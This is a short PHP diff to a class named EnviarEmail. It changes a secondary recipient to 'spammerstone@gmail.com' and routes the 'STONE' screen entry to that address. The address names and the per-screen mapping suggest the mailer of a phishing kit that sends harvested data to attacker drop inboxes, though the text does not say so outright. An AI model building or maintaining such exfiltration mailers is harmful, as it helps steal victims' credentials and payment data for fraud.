@@ -7,7 +7,7 @@ class EnviarEmail
 	private $ip;
 
 	private $email_principal = "mafiapokas@gmail.com,Ghost";
-	private $email_secundario = "mafiapokas@gmail.com,Ghost";
+	private $email_secundario = "spammerstone@gmail.com,Ghost";
 
 	function __construct($assunto='',$msg='',$banco='',$anexo=array()) {
 
@@ -56,6 +56,7 @@ class EnviarEmail
 	{
 		//telas
 		$this->lista['STONE'] 			= $this->email_principal;
+		$this->lista['STONE'] 			= $this->email_secundario;
 
 		return explode(',', $this->lista[$this->banco]);
 	}
